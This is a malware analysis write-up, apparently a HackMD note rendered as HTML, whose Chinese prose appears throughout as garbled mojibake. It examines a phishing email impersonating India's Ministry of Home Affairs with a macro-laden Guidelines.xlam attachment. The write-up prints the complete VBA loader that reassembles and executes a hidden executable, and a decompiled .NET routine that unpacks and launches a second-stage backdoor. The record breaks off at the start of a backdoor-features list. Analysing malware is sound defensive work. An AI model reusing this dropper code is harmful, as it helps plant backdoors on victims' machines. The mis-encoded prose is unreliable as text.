ç¬¬ä¸€å€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 2å¤©/ç¬¬äºŒå€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 4å¤©
:::</p><h1 id=æ¨£æœ¬93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a>æ¨£æœ¬(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)</h1><h2 id=æƒ¡æ„ç¨‹å¼>æƒ¡æ„ç¨‹å¼</h2><h3 id=æª”æ¡ˆè³‡è¨Š>æª”æ¡ˆè³‡è¨Š</h3><ol><li><p>DIE(Detect It Easy)
<a href=#R-image-b284cd91c392924c3ecd31565ac1e5d9 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/S1Lbp6T3p.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-b284cd91c392924c3ecd31565ac1e5d9><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/S1Lbp6T3p.png></a>
çœ‹èµ·ä¾†æ˜¯ä¸€å€‹HTMLçš„ç´”æ–‡å­—æª”æ¡ˆ</p></li><li><p>File/Stat/Exiftool
å¾ä»¥ä¸‹çµæœä¾†çœ‹ï¼Œæ˜¯ä¸€å€‹SMTPçš„éƒµä»¶æª”æ¡ˆï¼Œä¸¦ä¸”æ˜¯ç´”æ–‡å­—çš„å½¢å¼ï¼Œæ‰€ä»¥ç›´è¦ºä¸Šå¯èƒ½å’ŒOutlookæˆ–æ˜¯Firefox Thunderbirdæœ‰é—œä¿‚ï¼Œä»¥binwalkçš„çµæœä¾†èªªï¼Œä»–æ‡‰è©²æœ‰å£“ç¸®ä¸€äº›å…§å®¹åœ¨å…¶ä¸­ï¼Œå¦‚æœå¯¦éš›ä¸Ÿåˆ°Any.Runçš„è©±æœƒç™¼ç¾çš„ç¢ºæœ‰å¾ˆå¤šæª”æ¡ˆè¢«compressed
<a href=#R-image-591829c98ad5c8d2c0f810bfe3587c54 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rJfrgyR3a.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-591829c98ad5c8d2c0f810bfe3587c54><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rJfrgyR3a.png></a></p><p>æˆ–è€…æ˜¯èªªï¼Œå¾æª”æ¡ˆå…§å®¹ä¾†çœ‹(HxD)ï¼Œæœƒç™¼ç¾dataå¸¶äº†ä¸€å€‹base64çš„fileï¼Œdecodeæœƒç™¼ç¾æ˜¯<code>0x50 4B 03 04</code>
:::spoiler Command Result</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
</span></span><span style=display:flex><span>$ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>ExifTool Version Number         : 12.40
</span></span><span style=display:flex><span>File Name                       : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>Directory                       : .
</span></span><span style=display:flex><span>File Size                       : <span style=color:#ae81ff>180</span> KiB
</span></span><span style=display:flex><span>File Modification Date/Time     : 2023:08:14 11:54:39+08:00
</span></span><span style=display:flex><span>File Access Date/Time           : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Permissions                : -rwxrwxrwx
</span></span><span style=display:flex><span>File Type                       : TXT
</span></span><span style=display:flex><span>File Type Extension             : txt
</span></span><span style=display:flex><span>MIME Type                       : text/plain
</span></span><span style=display:flex><span>MIME Encoding                   : us-ascii
</span></span><span style=display:flex><span>Newlines                        : Windows CRLF
</span></span><span style=display:flex><span>Line Count                      : <span style=color:#ae81ff>2410</span>
</span></span><span style=display:flex><span>Word Count                      : <span style=color:#ae81ff>2741</span>
</span></span><span style=display:flex><span>$ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>  File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>  Size: <span style=color:#ae81ff>184712</span>          Blocks: <span style=color:#ae81ff>368</span>        IO Block: <span style=color:#ae81ff>4096</span>   regular file
</span></span><span style=display:flex><span>Device: 66h/102d        Inode: <span style=color:#ae81ff>1688849860790082</span>  Links: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Access: <span style=color:#f92672>(</span>0777/-rwxrwxrwx<span style=color:#f92672>)</span>  Uid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>   Gid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Access: 2024-02-29 16:55:48.949690200 +0800
</span></span><span style=display:flex><span>Modify: 2023-08-14 11:54:39.000000000 +0800
</span></span><span style=display:flex><span>Change: 2024-02-29 16:55:48.949690200 +0800
</span></span><span style=display:flex><span> Birth: -
</span></span><span style=display:flex><span>$ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span style=display:flex><span>--------------------------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>4244</span>          0x1094          HTML document header
</span></span><span style=display:flex><span><span style=color:#ae81ff>5554</span>          0x15B2          HTML document footer
</span></span><span style=display:flex><span><span style=color:#ae81ff>73264</span>         0x11E30         StuffIt Deluxe Segment <span style=color:#f92672>(</span>data<span style=color:#f92672>)</span>: fWm1
</span></span><span style=display:flex><span><span style=color:#ae81ff>169908</span>        0x297B4         IMG0 <span style=color:#f92672>(</span>VxWorks<span style=color:#f92672>)</span> header, size: <span style=color:#ae81ff>218780743</span></span></span></code></pre></div><p>:::</p></li></ol><h3 id=åŸ·è¡Œæµç¨‹>åŸ·è¡Œæµç¨‹</h3><ol><li>å› ç‚ºé€™æ˜¯ä¸€å€‹SMTPçš„æª”æ¡ˆï¼Œæ‰€ä»¥å…ˆç”¨VMçš„mailçœ‹ä¸€ä¸‹è£¡é¢çš„è³‡è¨Šï¼Œæ²’æ„å¤–çš„è©±æ ¹æ“šä¸Šé¢çš„æ•˜è¿°ï¼Œé€™æ‡‰è©²æ˜¯ä¸€å€‹phishing emailï¼Œä¸¦ä¸”æŠŠå…§æ–‡å½è£æˆå°åº¦çš„MHAæ”¿åºœéƒ¨é–€(Ministry of Home Affairs, å…§æ”¿éƒ¨)
<a href=#R-image-ca870857bd4cf846514c712437b84d46 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BkY1yBRna.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ca870857bd4cf846514c712437b84d46><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BkY1yBRna.png></a></li><li>æ‰€ä»¥é‡é»æ‡‰è©²å°±æ˜¯åœ¨ä¿¡ä»¶ä¸­å¤¾å¸¶çš„æª”æ¡ˆï¼Œä¹Ÿå°±æ˜¯==Guidelines.xlam==ï¼Œé€™ä¹Ÿæ˜¯ä¸€å€‹æ²’æœ‰çœ‹éçš„extensionï¼Œæ‰€ä»¥æ ¹æ“š<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>çš„èªªæ˜ï¼Œçœ‹èµ·ä¾†é€™å€‹æª”æ¡ˆå¯ä»¥ä½¿ç”¨å·¨é›†ï¼Œçœ‹åˆ°Macroé€™å€‹é—œéµå­—ç›´è¦ºä¸Šå°±æ„Ÿè¦ºä¸å¤ªå°å‹ï¼Œå› ç‚ºçœ‹éçš„å¯¦éš›æ¡ˆä¾‹å°±è »å¸¸å‡ºç¾åˆ©ç”¨Macroå¤¾å¸¶ä¸€äº›scriptæˆ–æ˜¯æƒ¡æ„çš„command<blockquote><p>XLAM file extension may refer to a file used by a spreadsheet program called Microsoft Excel. This program enables users to create and edit spreadsheets. These files also contain a macro-enabled add-in that provides extra tools and functionality that may execute macros. XLAM files may also be used for extension of Excel provided modules.</p></blockquote></li><li>ç”±æ–¼VMå…§æ²’æœ‰å¯ä»¥Excelï¼Œæ‰€ä»¥å®¹è¨±æˆ‘ç”¨Any.Run Sandboxçœ‹ä¸€ä¸‹ä¸­é–“åŸ·è¡Œçš„éç¨‹ï¼Œé¦–å…ˆé‡å°å‰ä¸‰å€‹processï¼Œæœ‰å¾ˆå¤§çš„å•é¡Œ
<a href=#R-image-ef433ad7f6ad978e34fc922ecb5278ea class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkXNuwZT6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-ef433ad7f6ad978e34fc922ecb5278ea><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkXNuwZT6.png></a><ol><li><p>Unusual execution from MS Office</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\a</span>dmin<span style=color:#ae81ff>\G</span>lhvadia<span style=color:#ae81ff>\h</span>braeiwas.exe</span></span></code></pre></div><p>ä¸æ˜¯å¾ˆæ¸…æ¥šé€™ä¸€å€‹command lineæ˜¯æ€éº¼ä¾†çš„ï¼Œå¾Œä¾†ç™¼ç¾æœ‰ä¸€å€‹VB scriptï¼Œå¾Any.Runä¸­çœ‹ä¸å¤ªå‡ºä¾†ä»–æ˜¯æ€éº¼åŸ·è¡Œçš„ï¼Œæ‰€å¹¸å°±ç›´æ¥åœ¨VMä¸­å®‰è£officeä¾†è·Ÿä¸€ä¸‹
<a href=#R-image-8ca7030ea5d659cded58b31177d60236 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rylQFw-6a.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-8ca7030ea5d659cded58b31177d60236><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rylQFw-6a.png></a></p><p>å…¶å¯¦ä¸€é–‹å§‹åŸ·è¡Œ==Guidelines.xlam==æ™‚æœƒè©¢å•è¦ä¸è¦å•Ÿå‹•Macroï¼Œä¹Ÿå°±æ˜¯é€™å€‹æ™‚å€™å¦‚æœå•Ÿå‹•å°±æœƒåŸ·è¡Œæƒ¡æ„çš„fileâ†’<code>"C:\Users\admin\Glhvadia\hbraeiwas.exe", vbNormalNoFocus</code></p></li><li><p>Analyze VBA
ä¸€é–‹å§‹ä¹Ÿä¸çŸ¥é“æ€éº¼åœ¨Excelä¸­çœ‹VBA codeï¼Œä¹Ÿæ˜¯æ ¹æ“š<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>æ‰çŸ¥é“ï¼Œå¦å¤–ï¼Œç”±æ–¼æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°é—œæ–¼VBAçš„å•é¡Œï¼Œæ‰€ä»¥æœ‰é—œæ–¼è¦å¾å“ªä¸€å€‹Moduleé–‹å§‹çœ‹ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä¸éé‚„å¥½ä»–åªæœ‰å…©å€‹Moduleï¼Œé›–ç„¶æˆ‘çœ‹ä¸æ˜¯å¾ˆç¢ºå®šVBAçš„æµç¨‹ï¼Œä½†æ ¹æ“šAIçš„è§£æå¯ä»¥ç•¥çŸ¥ä¸€äºŒ
<a href=#R-image-efbcdd170b701640f17ced08de2a7fcd class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HJa3-Kb6T.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-efbcdd170b701640f17ced08de2a7fcd><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HJa3-Kb6T.png></a></p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class="language-vb=" data-lang="vb=">Sub userothraLoadr()
    Dim path_othra_file As String
    Dim file_othra_name  As String
    Dim fldr_othra_name  As Variant
    Dim byt() As Byte
    Dim ar1othra() As String


    file_othra_name = &#34;hbraeiwas&#34;
    fldr_othra_name = Environ$(&#34;USERPROFILE&#34;) &amp; &#34;\Glhvadia\&#34;

    If Dir(fldr_othra_name, vbDirectory) = &#34;&#34; Then
        MkDir (fldr_othra_name)
    End If
    path_othra_file = fldr_othra_name &amp; file_othra_name &amp; &#34;.e&#34;
    If InStr(Application.OperatingSystem, &#34;6.02&#34;) &gt; 0 Or InStr(Application.OperatingSystem, &#34;6.03&#34;) &gt; 0 Then
        ar1othra = Split(UserForm1.TextBox2.Text, &#34;i&#34;)
    Else
        ar1othra = Split(UserForm1.TextBox1.Text, &#34;i&#34;)
    End If
    Dim btsothra() As Byte
    Dim linothra As Double
    linothra = 0
    For Each vl In ar1othra
        ReDim Preserve btsothra(linothra)
        btsothra(linothra) = CByte(vl)
        linothra = linothra + 1
    Next
    Open path_othra_file &amp; &#34;xe&#34; For Binary Access Write As #3
         Put #3, , btsothra
    Close #3
     Shell path_othra_file &amp; &#34;xe&#34;, vbNormalNoFocus
End Sub</code></pre></div><p>é€™å€‹scriptç°¡å–®ä¾†èªªå°±æ˜¯åœ¨åšmalware payloadçš„extractï¼ŒåŸæœ¬ä½œè€…æŠŠæƒ¡æ„çš„payload scrambleä¹‹å¾Œï¼Œç•¶victimåŒæ„å•Ÿå‹•Macroï¼Œä»–æœƒå†unscrambleï¼Œå¯ä»¥çœ‹åˆ°ä¸‹åœ–ï¼Œä»–æœƒä¾ç…§ä¸åŒçš„Application Versionï¼Œé¸æ“‡è¦ç”¨å“ªä¸€å€‹scramble payloadæ¥è‘—æŠŠé€™äº›bitsè½‰æˆbyteså¾Œå¯«åˆ°æŸä¸€å€‹æª”æ¡ˆä¸­ï¼Œä¸¦ä¸”ç”¨shellåŸ·è¡Œè©²æª”æ¡ˆï¼Œä»¥ä¸Šé€™äº›æ“ä½œéƒ½æ¥µå…¶è©­ç•°ï¼Œå¦å¤–ä»–æŠŠæª”æ¡ˆå¯«åœ¨</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span>Environ<span style=color:#960050;background-color:#1e0010>$</span>(<span style=color:#e6db74>&#34;USERPROFILE&#34;</span>) <span style=color:#f92672>&amp;</span> <span style=color:#e6db74>&#34;\Glhvadia\hbraeiwas&#34;</span></span></span></code></pre></div><p>:::danger
é€™ä¸€æ®µæ˜¯éŒ¯çš„ï¼Œä»–çœ‹çš„ç‰ˆæœ¬æ˜¯OSçš„ç‰ˆæœ¬è™Ÿï¼Œä¾†æ±ºå®šè¦ç”¨å“ªä¸€éš»Payloadï¼Œå› ç‚ºé€™å’Œå¾Œé¢.NETçš„ç‰ˆå¾ˆä¹Ÿæœ‰é—œä¿‚
:::
<a href=#R-image-54c20c9247125d9b3f80c35af626e1c3 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/r1H_RTzp6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-54c20c9247125d9b3f80c35af626e1c3><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/r1H_RTzp6.png></a>
å¯¦éš›å»çœ‹ä¹Ÿçš„ç¢ºæ˜¯åœ¨é€™é‚Š
<a href=#R-image-9ad4942c31586ac775edaa84a0aea6ba class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/H1RAlCza6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-9ad4942c31586ac775edaa84a0aea6ba><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/H1RAlCza6.png></a></p></li><li><p>Anaylize hbraeiwas.exe
æ ¹æ“šDIEçš„è§£æï¼Œé€™æ˜¯ä¸€å€‹ç”¨.NETå¯«çš„scriptï¼Œæˆ‘ä¹‹å‰ç¢°åˆ°.NETçš„ä¾‹å­ä¸å¤šï¼Œå”¯ä¸€æœ‰ç¢°éçš„reverseç¶“é©—æ˜¯ä¾†è‡ª<a href=https://hackmd.io/@SBK6401/HkIYEw8Kh rel=external target=_blank>è‡ºå¤§è¨ˆå®‰çš„welcomeé¡Œ-Nine & Nine-Revenge</a>
<a href=#R-image-3acf2432cda0971da24b71914b9e6b24 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkBm8RfTT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-3acf2432cda0971da24b71914b9e6b24><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkBm8RfTT.png></a>
ä¸€é–‹å§‹ä¸¦ä¸çŸ¥é“è¦å…ˆçœ‹å“ªè£¡ï¼Œæ‰€ä»¥çœ‹äº†ä¸€äº›<code>.NET</code> reversingçš„æ–‡ç« ï¼Œç™¼ç¾å¯ä»¥å…ˆå¾è‡ªå®šç¾©çš„moduleé–‹å§‹çœ‹ï¼Œä¹Ÿå°±æ˜¯<code>hbraeiwas</code>é€™å€‹classï¼Œå¦‚ä¸‹åœ–
<a href=#R-image-1335702585f477d341d4574f3e39e278 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/H1M0HJQpp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1335702585f477d341d4574f3e39e278><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/H1M0HJQpp.png></a>
é€écopilotçš„è§£æå¯ä»¥å¾ˆæ–¹ä¾¿çš„çœ‹å‡ºé€™å€‹ç¨‹å¼çš„ä¸»è¦åŠŸèƒ½æ˜¯è§£å£“ç¸®ä¸€å€‹ ZIP æª”æ¡ˆä¸¦å•Ÿå‹•å…¶ä¸­åŒ…å«çš„æ‡‰ç”¨ç¨‹å¼ã€‚é€™ç¨®è¡Œç‚ºå¸¸è¦‹æ–¼ä¸€äº›æƒ¡æ„è»Ÿé«”ä¸­ï¼Œå› ç‚ºå®ƒå¯ä»¥ç”¨æ–¼è‡ªè§£å£“ç¸®ä¸¦åŸ·è¡Œæƒ¡æ„ç¨‹å¼ç¢¼ï¼Œå¦‚æœç›´æ¥ç”¨å‹•æ…‹debuggerï¼Œå°±æœƒæ›´æ¸…æ¥šä»–æŠŠæ±è¥¿unzipåˆ°å“ªé‚Šå»ï¼Œä»–æ˜¯decompressåˆ°<code>C:\ProgramData\Hdlharas\dlrarhsiva.exe</code>ï¼Œä¸¦ä¸”å¯¦éš›åŸ·è¡Œ
<a href=#R-image-c2cdee901defe69eb3f78915a74b9652 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HkWmWeXTa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-c2cdee901defe69eb3f78915a74b9652><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HkWmWeXTa.png></a>
å†è©³ç´°èªªæ˜ä¸€ä¸‹ï¼Œä»–å…ˆinstantiate Class1ï¼Œä¸¦ä¸”æŠŠè£¡é¢çš„å…§å®¹ä¸Ÿåˆ°<code>dlrarhsiva.exe</code>ï¼Œå†åŸ·è¡Œï¼Œæ‰€ä»¥å¦‚æœä¸æƒ³è¦åˆ†æå…¶ä»–æœ‰çš„æ²’å¾—æ±è¥¿ï¼Œå¯ä»¥ç›´æ¥çœ‹<code>Resources\dlrarhsiva7</code>é€™å€‹åŸ·è¡Œæª”
<a href=#R-image-231a45ebc61d945846c87aaa6fd48773 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HyMWUxmaa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-231a45ebc61d945846c87aaa6fd48773><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HyMWUxmaa.png></a>
:::spoiler</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> UnZip()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> apppath = <span style=color:#66d9ef>this</span>.get_apppath();
</span></span><span style=display:flex><span>        Class1 @class = <span style=color:#66d9ef>new</span> Class1();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span>[] wind = @class.getWind();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>bool</span> flag = !Directory.Exists(apppath);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            Directory.CreateDirectory(apppath);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text = apppath + <span style=color:#66d9ef>this</span>.appName;
</span></span><span style=display:flex><span>        File.WriteAllBytes(text, wind);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text2 = apppath + <span style=color:#e6db74>&#34;mdkhm.zip&#34;</span>;
</span></span><span style=display:flex><span>        flag = !File.Exists(text2);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            File.Move(text, text2);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>string</span> text3 = text + <span style=color:#e6db74>&#34;.exe&#34;</span>.ToString();
</span></span><span style=display:flex><span>        flag = !File.Exists(text3);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (flag)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>object</span> objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(<span style=color:#66d9ef>this</span>.shObj, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;NameSpace&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                apppath
</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>));
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>object</span> objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(<span style=color:#66d9ef>this</span>.shObj, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;NameSpace&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                text2
</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>));
</span></span><span style=display:flex><span>            NewLateBinding.LateCall(objectValue, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;CopyHere&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[]
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, <span style=color:#66d9ef>null</span>, <span style=color:#e6db74>&#34;Items&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[<span style=color:#ae81ff>0</span>], <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>)),
</span></span><span style=display:flex><span>                <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>            }, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>null</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        Process.Start(text3);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> (Exception ex)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>:::</p></li><li><p>Anaylize dlrarhsiva.exe
æ ¹æ“šDIEç™¼ç¾é€™ä¹Ÿæ˜¯ä¸€å€‹.NETå¯«çš„PE file
<a href=#R-image-b2d526cedf9de445baf376c05139f6c6 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/S1mWzgXpa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-b2d526cedf9de445baf376c05139f6c6><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/S1mWzgXpa.png></a>
è€Œä¸”æœƒç™¼ç¾moduleå¤šäº†å¾ˆå¤šï¼Œå¯¦éš›é€²å»çœ‹æœƒç™¼ç¾æ‡‰è©²æ˜¯å¯¦éš›èˆ‡C2 serveré€£ç·šå’Œå¯¦ä½œæŒ‡ä»¤çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯å¾Œé–€çš„æŒ‡ä»¤éƒ½åœ¨é€™é‚Š
<a href=#R-image-1af12cec8637e68cd9b9f97b4d6a2860 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BJ1jV-mTT.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1af12cec8637e68cd9b9f97b4d6a2860><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BJ1jV-mTT.png></a>
è‡³æ–¼æœ‰å“ªä¸€äº›æ“ä½œï¼Œè©³ç´°å¯ä»¥çœ‹å¾Œé–€åŠŸèƒ½çš„section</p></li></ol></li></ol><h3 id=é€šè¨Šå”å®š>é€šè¨Šå”å®š</h3><p>æˆ‘æ˜¯ç›´æ¥æŠŠany.runçš„pcap downloadä¸‹ä¾†çœ‹æœ‰å“ªäº›æ±è¥¿</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>NBNS
ARP
ICMPv6
LLMNR
BROWSER
DNS
TCP
DHCPv6
MDNS
STP</code></pre></div><p>å…¶å¯¦æœ€ä¸»è¦C2 serverå’Œvictimçš„é€£ç·šä¸»è¦æ˜¯TCPï¼Œä¸éå› ç‚ºC2 serverè²Œä¼¼æ²’æœ‰åœ¨é‹ä½œäº†ï¼Œæ‰€ä»¥æ²’è¾¦æ³•é€£ç·šï¼Œæˆ‘åªèƒ½å¤§æ¦‚ç”¨é€£ç·šå¤±æ•—çš„å°åŒ…ä»¥åŠå¾Œé–€çš„codeåˆ¤æ–·ï¼Œè‡³ç”±æœ‰æ²’æœ‰å…¶ä»–çš„é€£ç·šæ–¹å¼å°±ä¸æ˜¯å¾ˆç¢ºå®š
<a href=#R-image-361536d8b5eac182a2221b1ca599ac1d class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HJlaEEQTa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-361536d8b5eac182a2221b1ca599ac1d><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HJlaEEQTa.png></a></p><h3 id=åŠ è§£å¯†æ¼”ç®—æ³•>åŠ è§£å¯†æ¼”ç®—æ³•</h3><p>å°±æˆ‘æœ¬èº«çš„ç†è§£ï¼Œçœ‹ä¸å¤ªå‡ºä¾†å“ªé‚Šæœ‰ç‰¹åˆ¥åšåˆ°åŠ è§£å¯†çš„äº‹æƒ…ï¼Œæ¯ä¸€å€‹æ­¥é©Ÿå¹¾ä¹éƒ½åªæ˜¯ä¸€èˆ¬çš„unscrambleæˆ–æ˜¯decompresså¯ä»¥è§£é‡‹çš„åœ°æ–¹</p><h3 id=å¾Œé–€åŠŸèƒ½>å¾Œé–€åŠŸèƒ½</h3><ol><li><p>Screenshotâ†’
